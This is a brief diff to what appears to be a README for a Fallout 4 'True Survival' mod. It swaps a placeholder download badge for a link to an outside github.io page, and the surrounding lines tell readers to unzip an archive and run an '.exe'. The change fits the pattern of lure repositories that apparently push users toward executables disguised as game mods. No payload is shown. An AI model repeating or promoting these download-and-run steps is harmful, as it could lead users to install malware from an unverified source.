@@ -13,7 +13,7 @@ Unzip the archive to a separate folder.
 
 Run the `.exe` file to start the application.  
 
-[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-2ea44f?style=for-the-badge)](https://fallout4-true-survival-pack.github.io/.github/)
 
 ## 📸 Overview
 ![fallout4-truesurvival-mechanics](https://github.com/user-attachments/assets/9084a9b9-7c88-41a5-b573-85500ddd3900)
